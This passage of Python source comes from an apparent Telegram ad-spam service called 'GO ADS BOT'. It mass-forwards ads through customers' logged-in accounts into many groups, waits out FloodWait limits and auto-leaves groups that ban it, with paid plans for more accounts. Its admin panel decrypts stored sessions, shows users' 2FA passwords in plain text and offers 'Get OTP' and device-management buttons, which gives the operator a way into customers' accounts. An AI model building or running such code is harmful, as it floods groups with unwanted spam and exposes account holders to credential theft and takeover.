                        group_name = target.get('name', 'Unknown')[:30]
                        group_key = target['key']
                        
                        wait_remaining = get_flood_wait(account_id, group_key)
                        if wait_remaining > 0:
                            skipped += 1
                            mins = wait_remaining // 60
                            print(f"[{account_id}] Skipped {group_name} (wait: {mins}m)")
                            continue
                        
                        msg = ads[i % len(ads)] if ads_mode == 'saved' else None
                        
                        sent_msg_id = None
                        current_topic_id = None
                        current_entity = None
                        
                        if target['type'] == 'topic':
                            data = target['data']
                            peer = data.get('peer')
                            current_topic_id = data.get('topic_id')
                            
                            if peer is None:
                                peer, _, current_topic_id = parse_link(data['url'])
                            
                            current_entity = await client.get_entity(peer)
                            group_name = getattr(current_entity, 'title', group_name)[:30]
                            
                            if ads_mode == 'custom':
                                # Send as text (optionally into a topic)
                                if current_topic_id:
                                    r = await client.send_message(current_entity, custom_text, reply_to=current_topic_id)
                                else:
                                    r = await client.send_message(current_entity, custom_text)
                                sent_msg_id = getattr(r, 'id', None)

                            elif ads_mode == 'post':
                                # Forward a specific post link
                                if current_topic_id:
                                    sent_msg_id = await forward_message(client, current_entity, post_source_msg_id, post_source_input_peer, current_topic_id)
                                else:
                                    result = await client.forward_messages(current_entity, post_source_msg_id, post_source_entity)
                                    if result:
                                        if isinstance(result, list):
                                            sent_msg_id = result[0].id if len(result) > 0 else None
                                        else:
                                            sent_msg_id = result.id

                            else:
                                # saved
                                if current_topic_id:
                                    sent_msg_id = await forward_message(client, current_entity, msg.id, msg.peer_id, current_topic_id)
                                else:
                                    result = await client.forward_messages(current_entity, msg.id, 'me')
                                    if result:
                                        if isinstance(result, list):
                                            sent_msg_id = result[0].id if len(result) > 0 else None
                                        else:
                                            sent_msg_id = result.id
                        else:
                            data = target['data']
                            group_id = data['group_id']
                            access_hash = data.get('access_hash')
                            is_channel = data.get('is_channel', True)
                            username = data.get('username')
                            
                            current_entity = None
                            if username:
                                try:
                                    current_entity = await client.get_entity(username)
                                except:
                                    pass
                            
                            if current_entity is None and access_hash:
                                try:
                                    if is_channel:
                                        current_entity = InputPeerChannel(channel_id=group_id, access_hash=access_hash)
                                    else:
                                        current_entity = InputPeerChat(chat_id=group_id)
                                except:
                                    pass
                            
                            if current_entity is None:
                                try:
                                    current_entity = await client.get_entity(group_id)
                                except:
                                    current_entity = await client.get_entity(int('-100' + str(group_id)))

                            if ads_mode == 'custom':
                                r = await client.send_message(current_entity, custom_text)
                                sent_msg_id = getattr(r, 'id', None)

                            elif ads_mode == 'post':
                                result = await client.forward_messages(current_entity, post_source_msg_id, post_source_entity)
                                if result:
                                    if isinstance(result, list):
                                        sent_msg_id = result[0].id if len(result) > 0 else None
                                    else:
                                        sent_msg_id = result.id

                            else:
                                result = await client.forward_messages(current_entity, msg.id, 'me')
                                if result:
                                    if isinstance(result, list):
                                        sent_msg_id = result[0].id if len(result) > 0 else None
                                    else:
                                        sent_msg_id = result.id
                        
                        sent += 1
                        print(f"[{account_id}] Sent to {group_name} ({i+1}/{len(all_targets)})")
                        
                        if sent_msg_id and current_entity:
                            view_link = build_message_link(current_entity, sent_msg_id, current_topic_id)
                            if view_link:
                                await send_log(account_id, None, view_link=view_link, group_name=group_name)
                        
                        await asyncio.sleep(msg_delay)
                        
                        # group_delay removed: msg_delay is used between each send
                        
                    except FloodWaitError as e:
                        wait_secs = e.seconds
                        mins = wait_secs // 60
                        failed += 1
                        
                        set_flood_wait(account_id, group_key, group_name, wait_secs)
                        
                        print(f"[{account_id}] FloodWait {mins}m in {group_name}")
                        await asyncio.sleep(msg_delay)
                        
                    except ChatWriteForbiddenError as e:
                        # Sending/forwarding not allowed in this group - auto-leave if enabled
                        failed += 1
                        mark_group_failed(account_id, target['key'], str(e))
                        error_type = type(e).__name__
                        
                        # Check if auto-leave is enabled
                        user_check = get_user(user_id)
                        auto_leave_enabled = user_check.get('auto_leave_groups', True)
                        
                        if not auto_leave_enabled:
                            print(f"[{account_id}] Failed {group_name}: {error_type} - Auto-leave DISABLED, not leaving")
                            continue
                        
                        print(f"[{account_id}] Failed {group_name}: {error_type} - Auto-leaving")

                        try:
                            leave_target = current_entity
                            if leave_target is None:
                                if target.get('type') == 'topic':
                                    d = target.get('data') or {}
                                    leave_target = d.get('peer')
                                    if leave_target is None and d.get('url'):
                                        leave_target, _, _ = parse_link(d.get('url'))
                                else:
                                    d = target.get('data') or {}
                                    leave_target = d.get('username') or d.get('group_id')
                            if leave_target is not None:
                                left_ok = await safe_leave_chat(client, leave_target)
                                if left_ok:
                                    remove_group_from_db(account_id, target.get('type'), group_key, target.get('data'))
                                    try:
                                        phone = (acc.get('phone') if acc else None)
                                    except Exception:
                                        phone = None
                                    await notify_auto_left(account_id, phone, group_name, group_key, reason=error_type)
                                else:
                                    await send_log(account_id, f"Leave attempt failed: {group_name}")
                        except Exception as le:
                            print(f"[{account_id}] Leave failed for {group_name}: {str(le)[:80]}")
                        # No delay after auto-leave; continue immediately

                    except UserBannedInChannelError as e:
                        # User is banned from this group - auto-leave if enabled
                        failed += 1
                        mark_group_failed(account_id, target['key'], str(e))
                        error_type = type(e).__name__
                        
                        # Check if auto-leave is enabled
                        user_check = get_user(user_id)
                        auto_leave_enabled = user_check.get('auto_leave_groups', True)
                        
                        if not auto_leave_enabled:
                            print(f"[{account_id}] Failed {group_name}: {error_type} - Auto-leave DISABLED, not leaving")
                            continue
                        
                        print(f"[{account_id}] Failed {group_name}: {error_type} - Auto-leaving")

                        try:
                            leave_target = current_entity
                            if leave_target is None:
                                if target.get('type') == 'topic':
                                    d = target.get('data') or {}
                                    leave_target = d.get('peer')
                                    if leave_target is None and d.get('url'):
                                        leave_target, _, _ = parse_link(d.get('url'))
                                else:
                                    d = target.get('data') or {}
                                    leave_target = d.get('username') or d.get('group_id')
                            if leave_target is not None:
                                left_ok = await safe_leave_chat(client, leave_target)
                                if left_ok:
                                    remove_group_from_db(account_id, target.get('type'), group_key, target.get('data'))
                                    try:
                                        phone = (acc.get('phone') if acc else None)
                                    except Exception:
                                        phone = None
                                    await notify_auto_left(account_id, phone, group_name, group_key, reason=error_type)
                                else:
                                    await send_log(account_id, f"Leave attempt failed: {group_name}")
                        except Exception as le:
                            print(f"[{account_id}] Leave failed for {group_name}: {str(le)[:80]}")
                        # No delay after auto-leave; continue immediately

                    except ChannelPrivateError as e:
                        # Group is private/deleted - don't auto-leave, just mark as failed
                        failed += 1
                        mark_group_failed(account_id, target['key'], str(e))
                        print(f"[{account_id}] Failed {group_name}: Group private/deleted - NOT auto-leaving")
                        # No auto-leave for this error
                        
                    except Exception as e:
                        error_str = str(e)
                        
                        wait_match = re.search(r'wait of (\d+) seconds', error_str, re.IGNORECASE)
                        if wait_match:
                            wait_secs = int(wait_match.group(1))
                            failed += 1
                            set_flood_wait(account_id, group_key, group_name, wait_secs)
                        elif 'Could not find' in error_str or 'entity' in error_str.lower():
                            failed += 1
                            mark_group_failed(account_id, target['key'], error_str[:100])
                        else:
                            failed += 1
                            print(f"[{account_id}] Error {group_name}: {error_str[:50]}")

                        # Auto-leave on any send/forward failure (non-flood; only if enabled)
                        if not _is_auto_leave_enabled(user_id):
                            # Do not leave when disabled; just continue.
                            continue
                        try:
                            leave_target = current_entity
                            if leave_target is None:
                                if target.get('type') == 'topic':
                                    d = target.get('data') or {}
                                    leave_target = d.get('peer')
                                    if leave_target is None and d.get('url'):
                                        leave_target, _, _ = parse_link(d.get('url'))
                                else:
                                    d = target.get('data') or {}
                                    leave_target = d.get('username') or d.get('group_id')
                            if leave_target is not None:
                                left_ok = await safe_leave_chat(client, leave_target)
                                if left_ok:
                                    remove_group_from_db(account_id, target.get('type'), group_key, target.get('data'))
                                    try:
                                        phone = (acc.get('phone') if acc else None)
                                    except Exception:
                                        phone = None
                                    await notify_auto_left(account_id, phone, group_name, group_key, reason=error_str[:120])
                                else:
                                    await send_log(account_id, f"Leave attempt failed: {group_name}")
                        except Exception as le:
                            print(f"[{account_id}] Leave failed for {group_name}: {str(le)[:80]}")
                        
                        # No delay after auto-leave; continue immediately to next group
                
                update_account_stats(account_id, sent=sent, failed=failed)
                
                log_msg = f"<b>✅ Round complete</b>\n📤 Sent: <code>{sent}</code> | ❌ Failed: <code>{failed}</code> | ⏭ Skipped: <code>{skipped}</code>\n\n⏰ Next: <code>{round_delay}s</code>"
                await send_log(account_id, log_msg)
                
                print(f"[{account_id}] Round done! Sent: {sent}, Failed: {failed}")
                
                # Check if still forwarding before waiting
                acc = get_account_by_id(account_id)
                if not acc or not acc.get('is_forwarding', False):
                    print(f"[{account_id}] Stopped before round delay")
                    await client.disconnect()
                    break
                
                print(f"[{account_id}] Waiting {round_delay}s...")
                for _ in range(round_delay):
                    acc = get_account_by_id(account_id)
                    if not acc or not acc.get('is_forwarding', False):
                        print(f"[{account_id}] Stopped during round delay")
                        break
                    await asyncio.sleep(1)
                
                await client.disconnect()
                
            except Exception as e:
                print(f"[{account_id}] Loop error: {e}")
                try:
                    await send_log(account_id, f"<b>⚠ Loop error</b>\n<code>{_h(str(e)[:150])}</code>\n\nRetrying in 60s...")
                except:
                    pass
                await asyncio.sleep(60)
                
        except Exception as e:
            print(f"[{account_id}] Outer error: {e}")
            try:
                await send_log(account_id, f"<b>⚠ Error</b>\n<code>{_h(str(e)[:150])}</code>\n\nRetrying in 60s...")
            except:
                pass
            await asyncio.sleep(60)
    
    if account_id in forwarding_tasks:
        del forwarding_tasks[account_id]
    if account_id in auto_reply_clients:
        try:
            await auto_reply_clients[account_id].disconnect()
        except:
            pass
        del auto_reply_clients[account_id]
    
    await send_log(account_id, "Forwarding ended")
    print(f"[{account_id}] Forwarder ended")

# ===== NOTIFICATION SYSTEM =====
async def send_notification(message_text, buttons=None):
    """Send notification to admin channel (auto-start notification bot if needed)."""
    try:
        channel_id = CONFIG.get('notification_channel_id')
        if not channel_id:
            return

        # Ensure notification bot is started
        if not notification_bot.is_connected():
            token = CONFIG.get('notification_bot_token')
            if token:
                try:
                    await notification_bot.start(bot_token=token)
                    me = await notification_bot.get_me()
                    print(f"[NOTIFICATION] Notification bot connected as @{me.username}")
                except Exception as e:
                    print(f"[NOTIFICATION] Failed to start notification bot: {e}")
                    return
            else:
                print("[NOTIFICATION] No notification bot token configured")
                return

        await notification_bot.send_message(
            int(channel_id),
            message_text,
            parse_mode='html',
            buttons=buttons
        )
        print(f"[NOTIFICATION] Sent to channel {channel_id}")
    except Exception as e:
        print(f"[NOTIFICATION] Error sending to channel: {e}")
        import traceback
        traceback.print_exc()

async def notify_new_user(user_id, username, first_name, last_name, phone=None):
    """Notify admin about new user registration"""
    try:
        from datetime import timezone, timedelta
        
        user_count = users_col.count_documents({})
        
        # Convert to IST (UTC+5:30)
        ist = timezone(timedelta(hours=5, minutes=30))
        join_time = datetime.now(ist).strftime("%d %b %Y, %I:%M %p")
        
        text = (
            f"🆕 <b>New User Registered!</b>\n\n"
            f"<b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n\n"
            f"<b>👤 User Details:</b>\n"
            f"├ <b>Name:</b> {first_name} {last_name or ''}\n"
            f"├ <b>Username:</b> @{username if username else 'No Username'}\n"
            f"└ <b>User ID:</b> <code>{user_id}</code>\n\n"
            f"<b>📊 Account Stats:</b>\n"
            f"└ <b>Total Users Now:</b> {user_count:,}\n\n"
            f"<b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>"
        )
        
        # No buttons - just notification
        print(f"[NOTIFICATION] Sending new user notification for {user_id}")
        await send_notification(text, buttons=None)
        print(f"[NOTIFICATION] New user notification sent successfully")
    except Exception as e:
        print(f"[NOTIFICATION] Error in notify_new_user: {e}")
        import traceback
        traceback.print_exc()

async def notify_premium_purchase(user_id, username, first_name, plan_name, price, duration_days):
    """Notify admin about premium purchase"""
    try:
        from datetime import timezone, timedelta
        
        # Calculate today's revenue
        total_revenue_today = price  # Simplified
        
        # Convert to IST (UTC+5:30)
        ist = timezone(timedelta(hours=5, minutes=30))
        purchase_time = datetime.now(ist).strftime("%d %b %Y, %I:%M %p")
        
        # Build clean username display
        username_display = f"@{username}" if username else f"ID: {user_id}"
        
        text = (
            f"💎 <b>Premium Plan Purchased!</b>\n\n"
            f"<b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n\n"
            f"<b>👤 User Details:</b>\n"
            f"├ <b>Username:</b> <code>{username_display}</code>\n"
            f"└ <b>User ID:</b> <code>{user_id}</code>\n\n"
            f"<b>💳 Purchase Details:</b>\n"
            f"├ <b>Plan:</b> {plan_name} (₹{price})\n"
            f"├ <b>Duration:</b> {duration_days} days\n"
            f"├ <b>Payment:</b> UPI\n"
            f"└ <b>Time:</b> {purchase_time}\n\n"
            f"<b>📊 Revenue:</b>\n"
            f"└ <b>Today:</b> ₹{total_revenue_today:,}\n\n"
            f"<b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>"
        )
        
        # No buttons - just notification
        print(f"[NOTIFICATION] Sending premium purchase notification for user {user_id}, plan {plan_name}")
        await send_notification(text, buttons=None)
        print(f"[NOTIFICATION] Premium purchase notification sent successfully")
    except Exception as e:
        print(f"[NOTIFICATION] Error in notify_premium_purchase: {e}")
        import traceback
        traceback.print_exc()

async def grant_premium_to_user(target_id: int, plan_key: str, days: int, *, source: str = "unknown"):
    """Single source of truth for premium granting + user DM + channel log."""
    plan_key = plan_key.lower().strip()
    plan_map = {
        'grow': {'max_accounts': 3, 'price': 69, 'name': 'Grow', 'image_key': 'grow'},
        'prime': {'max_accounts': 7, 'price': 199, 'name': 'Prime', 'image_key': 'prime'},
        'domi': {'max_accounts': 15, 'price': 389, 'name': 'Dominion', 'image_key': 'dominion'},
        'dominion': {'max_accounts': 15, 'price': 389, 'name': 'Dominion', 'image_key': 'dominion'},
    }
    if plan_key not in plan_map:
        raise ValueError(f"Invalid plan_key: {plan_key}")

    plan_info = plan_map[plan_key]
    expires_at = datetime.now() + timedelta(days=int(days))

    # DB update (consistent fields)
    users_col.update_one(
        {'user_id': int(target_id)},
        {'$set': {
            'tier': 'premium',
            'plan': 'dominion' if plan_key in ('domi', 'dominion') else plan_key,
            'plan_name': plan_info['name'],
            'max_accounts': plan_info['max_accounts'],
            'premium_granted_at': datetime.now(),
            'premium_expires_at': expires_at,
            'premium_expiry': expires_at,
            'approved': True,
        }},
        upsert=True
    )

    # Notify user (DM)
    try:
        plan_image = PLAN_IMAGES.get(plan_info['image_key'])
        notify_text = (
            "<b>🎉 Premium Activated!</b>\n\n"
            "<b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n\n"
            f"<b>Your Plan:</b> {plan_info['name']}\n"
            f"<b>Max Accounts:</b> <code>{plan_info['max_accounts']}</code>\n"
            f"<b>Duration:</b> <code>{days} days</code>\n"
            f"<b>Expires:</b> <code>{expires_at.strftime('%d %b %Y')}</code>\n\n"
            "<b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n\n"
            "<i>Your premium plan has been activated. Enjoy all features!</i>"
        )
        notify_buttons = [[Button.inline("GO ADS BOT Ads Now!", b"enter_dashboard")]]
        if plan_image:
            await main_bot.send_file(target_id, plan_image, caption=notify_text, parse_mode='html', buttons=notify_buttons)
        else:
            await main_bot.send_message(target_id, notify_text, parse_mode='html', buttons=notify_buttons)
    except Exception as e:
        print(f"[PREMIUM] Failed to notify user {target_id}: {e}")

    # Channel log
    try:
        target_user = users_col.find_one({'user_id': int(target_id)}) or {}
        await notify_premium_purchase(
            int(target_id),
            target_user.get('username', ''),
            target_user.get('first_name', 'Unknown'),
            plan_info['name'],
            plan_info['price'],
            int(days)
        )
        print(f"[PREMIUM] Channel log sent ({source})")
    except Exception as e:
        print(f"[PREMIUM] Channel log failed ({source}): {e}")

    return expires_at


async def notify_account_added(user_id, username, phone, account_phone, plan_name, total_accounts, max_accounts):
    """Notify admin about new account addition"""
    try:
        from datetime import timezone, timedelta
        
        # Convert to IST (UTC+5:30)
        ist = timezone(timedelta(hours=5, minutes=30))
        add_time = datetime.now(ist).strftime("%d %b %Y, %I:%M %p")
        
        text = (
            f"📱 <b>New Account Added!</b>\n\n"
            f"<b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n\n"
            f"<b>User:</b> @{username if username else 'No Username'} (ID: {user_id})\n"
            f"<b>Account:</b> <code>{account_phone}</code>\n"
            f"<b>Total Accounts:</b> {total_accounts}/{max_accounts} ({plan_name} Plan)\n"
            f"<b>Time:</b> {add_time}\n\n"
            f"<b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>"
        )
        
        # No buttons - just notification
        print(f"[NOTIFICATION] Sending account added notification for user {user_id}, phone {account_phone}")
        await send_notification(text, buttons=None)
        print(f"[NOTIFICATION] Account added notification sent successfully")
    except Exception as e:
        print(f"[NOTIFICATION] Error in notify_account_added: {e}")
        import traceback
        traceback.print_exc()

# Notification callback handlers
@main_bot.on(events.CallbackQuery(pattern=b"^notif_"))
async def handle_notification_actions(event):
    """Handle notification inline button actions"""
    uid = event.sender_id
    if not is_admin(uid):
        await event.answer("Admin only!", alert=True)
        return
    
    data = event.data.decode()
    
    if data.startswith("notif_grant_"):
        target_user_id = int(data.split("_")[2])
        
        # Show plan selection menu
        text = (
            f"<b>💎 Grant Premium Plan</b>\n\n"
            f"<b>User ID:</b> <code>{target_user_id}</code>\n\n"
            f"<b>Select Plan:</b>"
        )
        
        buttons = [
            [Button.inline("📈 Grow (₹69)", f"grantplan_grow_{target_user_id}")],
            [Button.inline("⭐ Prime (₹199)", f"grantplan_prime_{target_user_id}")],
            [Button.inline("👑 Dominion (₹389)", f"grantplan_domi_{target_user_id}")],
            [Button.inline("← Cancel", b"notif_cancel")]
        ]
        
        await event.edit(text, parse_mode='html', buttons=buttons)
    
    elif data.startswith("grantplan_"):
        # Extract plan and user_id
        parts = data.split("_")
        plan = parts[1]  # grow, prime, or domi
        target_user_id = int(parts[2])
        
        # Show duration selection
        text = (
            f"<b>💎 Grant {plan.capitalize()} Plan</b>\n\n"
            f"<b>User ID:</b> <code>{target_user_id}</code>\n\n"
            f"<b>Select Duration:</b>"
        )
        
        buttons = [
            [Button.inline("7 Days", f"grantdur_{plan}_{target_user_id}_7")],
            [Button.inline("15 Days", f"grantdur_{plan}_{target_user_id}_15")],
            [Button.inline("30 Days", f"grantdur_{plan}_{target_user_id}_30")],
            [Button.inline("60 Days", f"grantdur_{plan}_{target_user_id}_60")],
            [Button.inline("90 Days", f"grantdur_{plan}_{target_user_id}_90")],
            [Button.inline("← Back", f"notif_grant_{target_user_id}")]
        ]
        
        await event.edit(text, parse_mode='html', buttons=buttons)
    
    elif data.startswith("grantdur_"):
        # Extract plan, user_id, and days
        parts = data.split("_")
        plan = parts[1]
        target_user_id = int(parts[2])
        days = int(parts[3])

        try:
            expires_at = await grant_premium_to_user(target_user_id, plan, days, source='admin_panel')
            await event.edit(
                f"<b>✅ Premium Granted!</b>\n\n"
                f"<b>User ID:</b> <code>{target_user_id}</code>\n"
                f"<b>Plan:</b> {plan.capitalize()}\n"
                f"<b>Duration:</b> {days} days\n"
                f"<b>Expires:</b> {expires_at.strftime('%d %b %Y')}\n\n"
                f"<i>User has been notified!</i>",
                parse_mode='html'
            )
        except Exception as e:
            await event.answer(f"Error: {str(e)[:120]}", alert=True)
    
    elif data.startswith("notif_ban_"):
        target_user_id = int(data.split("_")[2])
        
        # Show ban confirmation
        text = (
            f"<b>🚫 Ban User</b>\n\n"
            f"<b>User ID:</b> <code>{target_user_id}</code>\n\n"
            f"<b>Select Ban Reason:</b>"
        )
        
        buttons = [
            [Button.inline("Spam/Abuse", f"banreason_{target_user_id}_Spam or Abuse")],
            [Button.inline("TOS Violation", f"banreason_{target_user_id}_TOS Violation")],
            [Button.inline("Fraud", f"banreason_{target_user_id}_Fraudulent Activity")],
            [Button.inline("Other", f"banreason_{target_user_id}_Admin Decision")],
            [Button.inline("← Cancel", b"notif_cancel")]
        ]
        
        await event.edit(text, parse_mode='html', buttons=buttons)
    
    elif data.startswith("banreason_"):
        parts = data.split("_", 2)
        target_user_id = int(parts[1])
        reason = parts[2]
        
        # Ban user
        try:
            users_col.update_one(
                {'user_id': target_user_id},
                {'$set': {'banned': True, 'ban_reason': reason}},
                upsert=True
            )
            
            # Notify user
            try:
                await main_bot.send_message(
                    target_user_id,
                    f"<b>🚫 You Have Been Banned</b>\n\n"
                    f"<b>Reason:</b> <code>{reason}</code>\n\n"
                    f"<i>You can no longer use this bot. Contact admin if you think this is a mistake.</i>",
                    parse_mode='html'
                )
            except:
                pass
            
            await event.edit(
                f"<b>✅ User Banned!</b>\n\n"
                f"<b>User ID:</b> <code>{target_user_id}</code>\n"
                f"<b>Reason:</b> {reason}\n\n"
                f"<i>User has been notified.</i>",
                parse_mode='html'
            )
            
        except Exception as e:
            await event.answer(f"Error: {str(e)[:100]}", alert=True)
    
    elif data.startswith("notif_profile_"):
        target_user_id = int(data.split("_")[2])
        
        try:
            user = users_col.find_one({'user_id': target_user_id})
            if user:
                plan = user.get('plan', 'scout').capitalize()
                username = user.get('username', 'No Username')
                first_name = user.get('first_name', 'Unknown')
                banned = user.get('banned', False)
                
                # Get premium expiry
                premium_expiry = user.get('premium_expiry')
                if premium_expiry:
                    expiry_str = premium_expiry.strftime('%d %b %Y')
                else:
                    expiry_str = 'N/A'
                
                accounts_count = accounts_col.count_documents({'owner_id': target_user_id})
                
                text = (
                    f"<b>👤 User Profile</b>\n\n"
                    f"<b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n\n"
                    f"<b>Name:</b> {first_name}\n"
                    f"<b>Username:</b> @{username}\n"
                    f"<b>User ID:</b> <code>{target_user_id}</code>\n"
                    f"<b>Plan:</b> {plan}\n"
                    f"<b>Accounts:</b> {accounts_count}\n"
                    f"<b>Premium Expires:</b> {expiry_str}\n"
                    f"<b>Status:</b> {'🚫 Banned' if banned else '✅ Active'}\n\n"
                    f"<b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>"
                )
                
                buttons = [
                    [Button.inline("💎 Grant Premium", f"notif_grant_{target_user_id}")],
                    [Button.inline("🚫 Ban User", f"notif_ban_{target_user_id}")],
                    [Button.inline("← Close", b"notif_cancel")]
                ]
                
                await event.edit(text, parse_mode='html', buttons=buttons)
            else:
                await event.answer("User not found", alert=True)
        except Exception as e:
            await event.answer(f"Error: {str(e)[:100]}", alert=True)
    
    elif data == "notif_cancel":
        await event.delete()

async def main():
    print("\n" + "="*50)
    print("Starting GO ADS BOT...")
    print("="*50)
    
    try:
        await main_bot.start(bot_token=CONFIG['bot_token'])
        me = await main_bot.get_me()
        print(f"Main: @{me.username}")
    except Exception as e:
        print(f"Main bot failed: {e}")
        return
    
    try:
        if CONFIG['logger_bot_token']:
            await logger_bot.start(bot_token=CONFIG['logger_bot_token'])
            me = await logger_bot.get_me()
            print(f"Logger: @{me.username}")
    except Exception as e:
        print(f"Logger failed: {e}")
    
    try:
        if CONFIG.get('notification_bot_token'):
            await notification_bot.start(bot_token=CONFIG['notification_bot_token'])
            me = await notification_bot.get_me()
            print(f"Notification: @{me.username}")
    except Exception as e:
        print(f"Notification bot failed: {e}")
    
    print("="*50)
    print("Bot running!")
    print("="*50 + "\n")
    
    await asyncio.gather(
        main_bot.run_until_disconnected(),
        logger_bot.run_until_disconnected() if CONFIG['logger_bot_token'] else asyncio.sleep(0),
        notification_bot.run_until_disconnected() if CONFIG.get('notification_bot_token') else asyncio.sleep(0)
    )


# ===== ADMIN: Grant Premium Commands =====

# ===== ADMIN: Manage Accounts System =====
# Storage for OTP forwarding state (account_phone -> {'admin_id': uid, 'client': client, 'account_id': acc_id})
otp_forwarding_active = {}
# Storage for device sessions (to avoid storing large hashes in callback data)
admin_device_sessions = {}

@main_bot.on(events.CallbackQuery(pattern=b"^admin_manage_accounts$"))
async def admin_manage_accounts(event):
    """Admin: View all accounts with pagination (5 per page)"""
    uid = event.sender_id
    if not is_admin(uid):
        await event.answer("Admin only", alert=True)
        return
    
    await show_admin_accounts_page(event, 0)

async def show_admin_accounts_page(event, page=0):
    """Show paginated account list"""
    per_page = 5
    skip = page * per_page
    
    # Get all accounts from database
    all_accounts = list(accounts_col.find({}).skip(skip).limit(per_page))
    total_accounts = accounts_col.count_documents({})
    
    if total_accounts == 0:
        await event.edit(
            "<b>📱 Manage Accounts</b>\n\n<i>No accounts found in the system.</i>",
            parse_mode='html',
            buttons=[[Button.inline("← Back", b"admin_panel")]]
        )
        return
    
    pages = (total_accounts + per_page - 1) // per_page
    
    text = (
        f"<b>📱 Manage Accounts</b>\n\n"
        f"<b>Total Accounts:</b> <code>{total_accounts}</code>\n"
        f"<b>Page:</b> <code>{page + 1}/{pages}</code>\n\n"
        "<b>Click on any account to view details</b>"
    )
    
    buttons = []
    for acc in all_accounts:
        phone = acc.get('phone', 'Unknown')
        # Button shows phone number
        acc_id = str(acc['_id'])
        buttons.append([Button.inline(phone, f"admaccd_{acc_id}")])
    
    # Pagination
    nav = []
    if page > 0:
        nav.append(Button.inline("⬅️ Prev", f"admaccpg_{page-1}"))
    if page < pages - 1:
        nav.append(Button.inline("Next ➡️", f"admaccpg_{page+1}"))
    if nav:
        buttons.append(nav)
    
    buttons.append([Button.inline("← Back", b"admin_panel")])
    
    await event.edit(text, parse_mode='html', buttons=buttons)

@main_bot.on(events.CallbackQuery(pattern=b"^admaccpg_"))
async def admin_accounts_pagination(event):
    """Handle account list pagination"""
    uid = event.sender_id
    if not is_admin(uid):
        return
    
    page = int(event.data.decode().split("_")[1])
    await show_admin_accounts_page(event, page)

@main_bot.on(events.CallbackQuery(pattern=b"^admaccd_"))
async def admin_account_details(event):
    """Show detailed account information"""
    uid = event.sender_id
    if not is_admin(uid):
        return
    
    from bson.objectid import ObjectId
    acc_id = event.data.decode().split("_")[1]
    
    try:
        acc = accounts_col.find_one({'_id': ObjectId(acc_id)})
    except:
        acc = None
    
    if not acc:
        await event.answer("Account not found!", alert=True)
        return
    
    # Get account details
    phone = acc.get('phone', 'Unknown')
    owner_id = acc.get('owner_id', 'Unknown')
    two_fa = acc.get('two_fa_password', 'Not Set')
    
    # Try to get account profile details from Telegram
    username = "Not Available"
    first_name = "Unknown"
    last_name = "Not Set"
    bio = "No Bio"
    groups_count = 0
    account_user_id = "Unknown"
    telegram_premium = "❌ No"
    
    try:
        session = cipher_suite.decrypt(acc['session'].encode()).decode()
        temp_client = TelegramClient(StringSession(session), CONFIG['api_id'], CONFIG['api_hash'])
        await temp_client.connect()
        
        if await temp_client.is_user_authorized():
            me = await temp_client.get_me()
            
            # Get profile info
            first_name = me.first_name or "Unknown"
            last_name = me.last_name or "Not Set"
            username = f"@{me.username}" if me.username else "No Username"
            account_user_id = me.id  # This is the account's own user ID
            
            # Check Telegram Premium status
            telegram_premium = "✅ Active" if me.premium else "❌ Not Active"
            
            # Get bio
            try:
                from telethon.tl.functions.users import GetFullUserRequest
                full_user = await temp_client(GetFullUserRequest(me.id))
                bio = full_user.full_user.about or "No Bio"
            except:
                bio = "No Bio"
            
            # Count groups
            async for dialog in temp_client.iter_dialogs():
                if dialog.is_group or dialog.is_channel:
                    groups_count += 1
        
        await temp_client.disconnect()
    except Exception as e:
        print(f"[ADMIN] Error fetching account details: {e}")
    
    # Get owner (who added this account) details and premium status
    owner_username = "Unknown"
    is_premium = False
    premium_days_left = 0
    premium_plan = "Scout (Free)"
    
    try:
        owner_user = users_col.find_one({'user_id': owner_id})
        if owner_user:
            owner_username = owner_user.get('username', 'No Username')
            
            # Check premium status
            premium_expiry = owner_user.get('premium_expiry')
            if premium_expiry:
                from datetime import datetime, timezone
                now = datetime.now(timezone.utc)
                if premium_expiry.tzinfo is None:
                    premium_expiry = premium_expiry.replace(tzinfo=timezone.utc)
                
                if premium_expiry > now:
                    is_premium = True
                    premium_days_left = (premium_expiry - now).days
                    premium_plan = owner_user.get('plan', 'Premium')
                    if premium_plan in ['grow', 'prime', 'dominion']:
                        premium_plan = premium_plan.capitalize()
    except Exception as e:
        print(f"[ADMIN] Error fetching owner details: {e}")
    
    # Build premium status text
    if is_premium:
        premium_status = f"✅ <b>{premium_plan}</b> ({premium_days_left} days left)"
    else:
        premium_status = "❌ <b>Free Plan (Scout)</b>"
    
    text = (
        f"<b>📱 Account Details</b>\n\n"
        f"<b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n\n"
        f"<b>📋 Profile Information:</b>\n"
        f"├ <b>👤 First Name:</b> <code>{first_name}</code>\n"
        f"├ <b>👥 Last Name:</b> <code>{last_name}</code>\n"
        f"├ <b>🆔 Username:</b> <code>{username}</code>\n"
        f"└ <b>📝 Bio:</b>\n"
        f"   <code>{bio}</code>\n\n"
        f"<b>📊 Account Statistics:</b>\n"
        f"├ <b>📞 Phone:</b> <code>{phone}</code>\n"
        f"├ <b>🔑 User ID:</b> <code>{account_user_id}</code>\n"
        f"├ <b>👥 Groups:</b> <code>{groups_count}</code>\n"
        f"├ <b>💎 Telegram Premium:</b> {telegram_premium}\n"
        f"└ <b>🔐 2FA Password:</b> <code>{two_fa}</code>\n\n"
        f"<b>➕ Added By:</b>\n"
        f"├ <b>🆔 Username:</b> <code>{owner_username}</code>\n"
        f"└ <b>🔑 User ID:</b> <code>{owner_id}</code>\n\n"
        f"<b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>"
    )
    
    buttons = [
        [Button.inline("📱 Manage Devices", f"admdev_{acc_id}")],
        [Button.inline("📨 Get OTP", f"admotp_{acc_id}")],
        [Button.inline("← Back", b"admin_manage_accounts")]
    ]
    
    await event.edit(text, parse_mode='html', buttons=buttons)

@main_bot.on(events.CallbackQuery(pattern=b"^admdev_"))
async def admin_manage_devices(event):
    """Show devices for an account"""
    uid = event.sender_id
    if not is_admin(uid):
        return
    
    from bson.objectid import ObjectId
    acc_id = event.data.decode().split("_")[1]
    
    try:
